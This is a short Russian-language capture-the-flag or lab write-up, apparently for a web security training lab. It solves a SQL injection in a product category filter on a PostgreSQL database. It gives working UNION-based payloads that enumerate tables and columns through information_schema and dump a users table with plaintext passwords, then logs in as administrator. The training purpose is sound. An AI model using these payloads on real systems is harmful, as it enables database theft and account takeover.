
# Разведка

При разведке было выявлено что при выборе категории есть уязвимость к SQL инъекции
![[Pasted image 20250119111154.png]]

При большем углубление было выявлена версия бд и название самой бд
```
PostgreSQL 12.20 (Ubuntu 12.20-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
```

# Эксплуатация 

Выводим все имена таблиц существующих в данной бд
```
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

В списке есть множество таблиц, особый интерес: administrable_role_authorizations и users_hriaiz

#### users_hriaiz

Выведем колонки данной таблицы
```
' UNION SELECT column_name, 'NULL' FROM information_schema.columns WHERE table_name = 'users_hriaiz'--
```

В ответе содержится: password_ewhkkh username_ildiqh и email.
- Для входа надо Username и Password так что достанем ток 2 столбца
```
' UNION SELECT username_ildiqh, password_ewhkkh FROM users_hriaiz--
```

В ответе содержится:
```
carlos|r4zp4k8esad9xeqv3vge
wiener|iaho9cz92fvsrw0qnq7a
administrator|gbvvpf2cl8sc88o54v3p
```

Пробуем авторизоваться от administrator. Лаба решена)